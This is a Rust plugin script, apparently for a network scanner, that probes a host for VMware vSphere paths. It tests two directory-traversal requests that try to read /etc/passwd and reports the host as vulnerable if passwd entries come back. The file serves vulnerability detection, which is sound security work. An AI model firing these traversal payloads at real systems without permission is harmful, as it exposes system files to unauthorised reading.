/* http-vmware-path-vuln - VMware path traversal and path probe */
#![allow(dead_code)]
mod arsenal;
use arsenal::*;

#[no_mangle]
pub extern "C" fn almap_script_run(ctx: *mut AlScriptContext) -> i32 {
    let paths = [
        "/sdk/", "/sdk/vimService.wsdl", "/sdk/vimService.wsdl?wsdl",
        "/vpx/", "/ui/", "/folder/", "/sdk/../../../../etc/passwd",
        "/ui/../../../../etc/passwd",
    ];
    let mut found = 0usize;
    for p in paths.iter() {
        let resp = match http_request(ctx, "GET", p, None, "", "", None, 8192) {
            Some(r) if !r.is_empty() => r,
            _ => continue,
        };
        let code = http_status(&resp);
        let body = http_body(&resp);
        if body.contains("root:x:") || body.contains("daemon:x:") {
            set_out(ctx, &format!("VULNERABLE: VMware path traversal at {}", p));
            return 0;
        }
        if code != 404
            && (contains_ci(body, "vmware") || contains_ci(body, "vimService")
                || contains_ci(body, "vSphere"))
        {
            append_out(ctx, &format!("{}{} [{}]",
                if found == 0 { "VMware paths: " } else { ", " }, p, code));
            found += 1;
        }
    }
    if found == 0 {
        set_out(ctx, "VMware path vulnerability: not detected");
    }
    0
}
